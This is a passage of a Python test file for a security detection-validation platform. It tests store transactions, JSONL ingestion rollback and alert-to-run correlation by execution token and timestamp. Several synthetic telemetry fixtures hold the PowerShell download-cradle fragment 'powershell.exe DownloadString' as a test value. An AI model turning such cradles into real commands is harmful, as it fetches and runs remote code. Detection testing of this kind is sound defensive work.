            pass

    def thread2_worker():
        t1_inside.wait(timeout=2.0)
        # Thread 2 enters transaction; since Thread 1 holds _lock, Thread 2 blocks until Thread 1 rolls back
        t2_blocked.set()
        with store.transaction():
            store.add_scenario(
                ScenarioV1(
                    scenario_id="SCN-TX2-SUCCESS",
                    name="Scenario TX2",
                    mitre_technique_id="T1059.001",
                    mitre_tactic="Execution",
                    expected_event_category=EventCategory.PROCESS_CREATION,
                    validation_target=ValidationTarget.EXPECTED_ALERT,
                )
            )

    t1 = threading.Thread(target=thread1_worker)
    t2 = threading.Thread(target=thread2_worker)
    t1.start()
    t2.start()
    t1.join(timeout=3.0)
    t2.join(timeout=3.0)

    committed = {s.scenario_id for s in store.list_scenarios()}
    assert "SCN-TX2-SUCCESS" in committed
    assert "SCN-TX1-FAIL" not in committed


def test_in_memory_store_tx_overlap_with_unlocked_direct_write():
    """Verify that a direct write outside a transaction is never clobbered
    by an overlapping transaction that rolls back.
    """
    store = InMemoryStore()
    t1_inside = threading.Event()
    t2_started = threading.Event()

    def tx_worker():
        try:
            with store.transaction():
                store.add_scenario(
                    ScenarioV1(
                        scenario_id="SCN-TX-ROLLBACK",
                        name="Scenario TX Rollback",
                        mitre_technique_id="T1059.001",
                        mitre_tactic="Execution",
                        expected_event_category=EventCategory.PROCESS_CREATION,
                        validation_target=ValidationTarget.EXPECTED_ALERT,
                    )
                )
                t1_inside.set()
                t2_started.wait(timeout=2.0)
                # Sleep briefly so direct_worker is guaranteed waiting at with self._lock
                time.sleep(0.02)
                raise ValueError("Rollback transaction")
        except ValueError:
            pass

    def direct_worker():
        t1_inside.wait(timeout=2.0)
        t2_started.set()
        # Direct write outside transaction: must block on store._lock until tx_worker finishes rollback
        store.add_scenario(
            ScenarioV1(
                scenario_id="SCN-DIRECT-WRITE",
                name="Scenario Direct",
                mitre_technique_id="T1059.001",
                mitre_tactic="Execution",
                expected_event_category=EventCategory.PROCESS_CREATION,
                validation_target=ValidationTarget.EXPECTED_ALERT,
            )
        )

    t1 = threading.Thread(target=tx_worker)
    t2 = threading.Thread(target=direct_worker)
    t1.start()
    t2.start()
    t1.join(timeout=3.0)
    t2.join(timeout=3.0)

    committed = {s.scenario_id for s in store.list_scenarios()}
    assert "SCN-DIRECT-WRITE" in committed
    assert "SCN-TX-ROLLBACK" not in committed


def test_in_memory_store_nested_transactions():
    """Verify nested transaction support on InMemoryStore:
    1. Inner transaction rollback does not roll back uncommitted outer operations.
    2. Outer transaction rollback rolls back everything including committed inner operations.
    """
    store = InMemoryStore()
    scn1 = ScenarioV1(
        scenario_id="SCN-NEST-01",
        name="Scenario Nest 1",
        mitre_technique_id="T1059.001",
        mitre_tactic="Execution",
        expected_event_category=EventCategory.PROCESS_CREATION,
        validation_target=ValidationTarget.EXPECTED_ALERT,
    )
    scn2 = ScenarioV1(
        scenario_id="SCN-NEST-02",
        name="Scenario Nest 2",
        mitre_technique_id="T1059.001",
        mitre_tactic="Execution",
        expected_event_category=EventCategory.PROCESS_CREATION,
        validation_target=ValidationTarget.EXPECTED_ALERT,
    )

    # Case 1: Inner transaction rolls back, outer handles it and commits scn1
    with store.transaction():
        store.add_scenario(scn1)
        try:
            with store.transaction():
                store.add_scenario(scn2)
                raise ValueError("Inner rollback")
        except ValueError:
            pass

    assert store.get_scenario("SCN-NEST-01") is not None
    assert store.get_scenario("SCN-NEST-02") is None

    # Reset store for Case 2
    store.reset()

    # Case 2: Inner transaction commits, outer transaction rolls back
    try:
        with store.transaction():
            store.add_scenario(scn1)
            with store.transaction():
                store.add_scenario(scn2)
            # Both added, now outer raises
            raise ValueError("Outer rollback")
    except ValueError:
        pass

    assert store.get_scenario("SCN-NEST-01") is None
    assert store.get_scenario("SCN-NEST-02") is None


def test_in_memory_store_reset_overlap_deterministic():
    """Verify reset() is synchronized under _lock and does not corrupt concurrent reads or writes."""
    store = InMemoryStore()
    errors = []

    def writer():
        for i in range(50):
            try:
                store.add_scenario(
                    ScenarioV1(
                        scenario_id=f"SCN-RESET-{i:03d}",
                        name=f"Scenario {i}",
                        mitre_technique_id="T1059.001",
                        mitre_tactic="Execution",
                        expected_event_category=EventCategory.PROCESS_CREATION,
                        validation_target=ValidationTarget.EXPECTED_ALERT,
                    )
                )
            except ValueError:
                # Duplicate ID if writer encounters reset and restarts
                pass
            except Exception as e:
                errors.append(f"Writer error: {e}")

    def reader_resetter():
        for _ in range(20):
            try:
                scenarios = store.list_scenarios()
                assert isinstance(scenarios, list)
                store.reset()
            except Exception as e:
                errors.append(f"Reader/resetter error: {e}")

    t1 = threading.Thread(target=writer)
    t2 = threading.Thread(target=reader_resetter)
    t1.start()
    t2.start()
    t1.join(timeout=3.0)
    t2.join(timeout=3.0)

    assert not errors, f"Concurrent reset errors: {errors}"


# ── 11. JSONL Storage Error Handling & Atomic Rollback ────────────────────────


def test_jsonl_invalid_input_response():
    """Verify invalid JSONL input produces the documented client response."""
    app = create_application()
    client = TestClient(app)
    content = '{"invalid_field": 123}\n{broken json\n'
    resp = client.post(
        "/api/v1/ingest/jsonl",
        json={"schema_type": "scenario", "content": content, "store": False},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["is_valid"] is False
    assert data["error_count"] == 2
    assert data["valid_count"] == 0
    assert data["stored"] is False
    assert len(data["errors"]) == 2
    err_types = {e["error_type"] for e in data["errors"]}
    assert "ValidationError" in err_types
    assert "JSONDecodeError" in err_types


def test_jsonl_storage_failure_rolls_back_atomic_batch():
    """Verify storage failure rolls back an atomic batch: 0 persisted records, error reported."""
    reset_store()
    app = create_application()
    client = TestClient(app)

    store = get_store()
    store.reset()
    store.add_scenario(
        ScenarioV1(
            scenario_id="SCN-EXISTING",
            name="Existing Scenario",
            mitre_technique_id="T1059.001",
            mitre_tactic="Execution",
            expected_event_category=EventCategory.PROCESS_CREATION,
            validation_target=ValidationTarget.EXPECTED_ALERT,
        )
    )

    scn_new = '{"scenario_id": "SCN-NEW-ATOMIC", "name": "New Scn", "mitre_technique_id": "T1059.001", "mitre_tactic": "Execution", "expected_event_category": "PROCESS_CREATION", "validation_target": "EXPECTED_ALERT"}'
    scn_dup = '{"scenario_id": "SCN-EXISTING", "name": "Dup Scn", "mitre_technique_id": "T1059.001", "mitre_tactic": "Execution", "expected_event_category": "PROCESS_CREATION", "validation_target": "EXPECTED_ALERT"}'
    content = f"{scn_new}\n{scn_dup}\n"

    resp = client.post(
        "/api/v1/ingest/jsonl",
        json={"schema_type": "scenario", "content": content, "store": True, "atomic": True},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["stored"] is False
    assert data["persisted_count"] == 0
    assert data["error_count"] >= 1
    assert any(e["error_type"] == "StorageError" for e in data["errors"])

    # Verify atomic rollback: SCN-NEW-ATOMIC was NOT persisted
    assert store.get_scenario("SCN-NEW-ATOMIC") is None


def test_jsonl_unexpected_programming_exception_propagates(monkeypatch):
    """Verify unexpected programming errors (e.g. AttributeError, TypeError) are NOT
    swallowed or disguised as validation/storage errors, but propagate out.
    """
    reset_store()
    app = create_application()
    store = get_store()
    store.reset()

    def broken_add_scenario(scenario):
        raise TypeError("Unexpected internal programming error: invalid object attribute type")

    monkeypatch.setattr(store, "add_scenario", broken_add_scenario)

    client = TestClient(app, raise_server_exceptions=True)
    scn_valid = '{"scenario_id": "SCN-PROG-ERR", "name": "Scn", "mitre_technique_id": "T1059.001", "mitre_tactic": "Execution", "expected_event_category": "PROCESS_CREATION", "validation_target": "EXPECTED_ALERT"}'

    with pytest.raises(TypeError, match="Unexpected internal programming error"):
        client.post(
            "/api/v1/ingest/jsonl",
            json={"schema_type": "scenario", "content": scn_valid, "store": True, "atomic": True},
        )


def test_jsonl_best_effort_ingestion_behavior_unchanged():
    """Verify fault-isolated (best-effort) mode persists valid records while isolating storage failures."""
    reset_store()
    app = create_application()
    client = TestClient(app)
    store = get_store()
    store.reset()

    store.add_scenario(
        ScenarioV1(
            scenario_id="SCN-BE-DUP",
            name="Existing Scenario",
            mitre_technique_id="T1059.001",
            mitre_tactic="Execution",
            expected_event_category=EventCategory.PROCESS_CREATION,
            validation_target=ValidationTarget.EXPECTED_ALERT,
        )
    )

    rec1 = '{"scenario_id": "SCN-BE-01", "name": "Scn 1", "mitre_technique_id": "T1059.001", "mitre_tactic": "Execution", "expected_event_category": "PROCESS_CREATION", "validation_target": "EXPECTED_ALERT"}'
    rec2_dup = '{"scenario_id": "SCN-BE-DUP", "name": "Dup", "mitre_technique_id": "T1059.001", "mitre_tactic": "Execution", "expected_event_category": "PROCESS_CREATION", "validation_target": "EXPECTED_ALERT"}'
    rec3 = '{"scenario_id": "SCN-BE-03", "name": "Scn 3", "mitre_technique_id": "T1059.001", "mitre_tactic": "Execution", "expected_event_category": "PROCESS_CREATION", "validation_target": "EXPECTED_ALERT"}'
    content = f"{rec1}\n{rec2_dup}\n{rec3}\n"

    resp = client.post(
        "/api/v1/ingest/jsonl",
        json={"schema_type": "scenario", "content": content, "store": True, "atomic": False},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["stored"] is True
    assert data["persisted_count"] == 2
    assert data["valid_count"] == 2
    assert data["error_count"] == 1
    assert any(e["error_type"] == "StorageError" for e in data["errors"])

    # SCN-BE-01 and SCN-BE-03 are in store
    assert store.get_scenario("SCN-BE-01") is not None
    assert store.get_scenario("SCN-BE-03") is not None


# ── 12. Verification of Phase 14 Alert Correlation & Token Reuse ──────────────


def test_pre_execution_alert_rejected_in_strict_mode(base_adv_fixtures):
    """An alert timestamped prior to run.executed_at must NEVER produce PASS in strict mode,
    even when it carries the exact matching execution token.
    """
    scn, rule, t0 = base_adv_fixtures
    store = InMemoryStore()
    store.add_scenario(scn)
    store.add_rule(rule)
    token = "TOK-STRICT-PRE-01"

    run = TestRunV1(
        run_id="RUN-STRICT-PRE",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-ADV-01",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=20),
        executed_at=t0 + timedelta(minutes=10),
        execution_token=token,
    )
    store.add_run(run)

    # Valid telemetry during execution
    ev = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-STRICT-01",
        raw_event_id="RAW-S1",
        source_event_id="SRC-S1",
        source_timestamp=t0 + timedelta(minutes=12),
        normalized_timestamp=t0 + timedelta(minutes=12),
        event_category=EventCategory.PROCESS_CREATION,
        host=run.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
        execution_token=token,
    )
    store.add_normalized_event(ev)

    # Stale alert with matching token timestamped BEFORE executed_at
    stale_alert = AlertV1(
        alert_id="ALT-STALE-TOK",
        source_alert_id="SRC-A-STALE-TOK",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=5),  # 5 min before executed_at (t0 + 10m)
        host_id=run.target_host,
        rule_reference=scn.expected_detection_rule_id,
        execution_token=token,
    )
    store.add_alert(stale_alert)

    engine = AssuranceEngine(store)
    res = engine.evaluate_run(run.run_id, strict_attribution=True)

    assert res.predicted_category != DiagnosticCategory.PASS
    assert res.predicted_category == DiagnosticCategory.DETECTION_NOT_TRIGGERED
    assert stale_alert.alert_id not in res.supporting_evidence_ids


def test_post_execution_alert_produces_pass_in_both_modes(base_adv_fixtures):
    """A legitimate alert arriving after executed_at must produce PASS in both
    default and strict attribution modes.
    """
    scn, rule, t0 = base_adv_fixtures
    token = "TOK-POST-LEGIT"

    for strict_mode in (False, True):
        store = InMemoryStore()
        store.add_scenario(scn)
        store.add_rule(rule)

        run = TestRunV1(
            run_id=f"RUN-POST-{strict_mode}",
            scenario_id=scn.scenario_id,
            execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
            target_host="WS-ADV-01",
            target_user="secops",
            window_start=t0,
            window_end=t0 + timedelta(minutes=20),
            executed_at=t0 + timedelta(minutes=10),
            execution_token=token if strict_mode else None,
        )
        store.add_run(run)

        ev = NormalizedTelemetryEventV1(
            normalized_event_id=f"NORM-POST-{strict_mode}",
            raw_event_id=f"RAW-P-{strict_mode}",
            source_event_id=f"SRC-P-{strict_mode}",
            source_timestamp=t0 + timedelta(minutes=11),
            normalized_timestamp=t0 + timedelta(minutes=11),
            event_category=EventCategory.PROCESS_CREATION,
            host=run.target_host,
            process_name="powershell.exe",
            command_line="powershell.exe DownloadString",
            execution_token=token if strict_mode else None,
        )
        store.add_normalized_event(ev)

        # Legitimate alert timestamped 2 minutes after executed_at
        legit_alert = AlertV1(
            alert_id=f"ALT-LEGIT-{strict_mode}",
            source_alert_id=f"SRC-A-LEGIT-{strict_mode}",
            source_type="sigma",
            alert_timestamp=t0 + timedelta(minutes=12),
            host_id=run.target_host,
            rule_reference=scn.expected_detection_rule_id,
            execution_token=token if strict_mode else None,
        )
        store.add_alert(legit_alert)

        engine = AssuranceEngine(store)
        res = engine.evaluate_run(run.run_id, strict_attribution=strict_mode)

        assert res.predicted_category == DiagnosticCategory.PASS
        assert legit_alert.alert_id in res.supporting_evidence_ids


def test_different_tokens_across_hosts_no_false_conflict(base_adv_fixtures):
    """Runs on different hosts with DIFFERENT tokens must NEVER trigger conflict (INCONCLUSIVE).
    They must evaluate cleanly to PASS.
    """
    scn, rule, t0 = base_adv_fixtures
    store = InMemoryStore()
    store.add_scenario(scn)
    store.add_rule(rule)

    run1 = TestRunV1(
        run_id="RUN-HOST-A",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-ALPHA",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=20),
        executed_at=t0 + timedelta(minutes=5),
        execution_token="TOK-ALPHA-UNIQUE",
    )
    run2 = TestRunV1(
        run_id="RUN-HOST-B",
        scenario_id=scn.scenario_id,
        execution_mode=ExecutionMode.SYNTHETIC_SIMULATION,
        target_host="WS-BETA",
        target_user="secops",
        window_start=t0,
        window_end=t0 + timedelta(minutes=20),
        executed_at=t0 + timedelta(minutes=6),
        execution_token="TOK-BETA-UNIQUE",
    )
    store.add_run(run1)
    store.add_run(run2)

    ev1 = NormalizedTelemetryEventV1(
        normalized_event_id="NORM-A-01",
        raw_event_id="RAW-A1",
        source_event_id="SRC-A1",
        source_timestamp=t0 + timedelta(minutes=7),
        normalized_timestamp=t0 + timedelta(minutes=7),
        event_category=EventCategory.PROCESS_CREATION,
        host=run1.target_host,
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString",
        execution_token="TOK-ALPHA-UNIQUE",
    )
    alt1 = AlertV1(
        alert_id="ALT-A-01",
        source_alert_id="SRC-ALT-A1",
        source_type="sigma",
        alert_timestamp=t0 + timedelta(minutes=8),
        host_id=run1.target_host,
        rule_reference=rule.rule_id,
        execution_token="TOK-ALPHA-UNIQUE",
    )
    store.add_normalized_event(ev1)
    store.add_alert(alt1)

    engine = AssuranceEngine(store)
    res1 = engine.evaluate_run(run1.run_id, strict_attribution=True)

    assert res1.predicted_category == DiagnosticCategory.PASS
    assert res1.predicted_category != DiagnosticCategory.INCONCLUSIVE

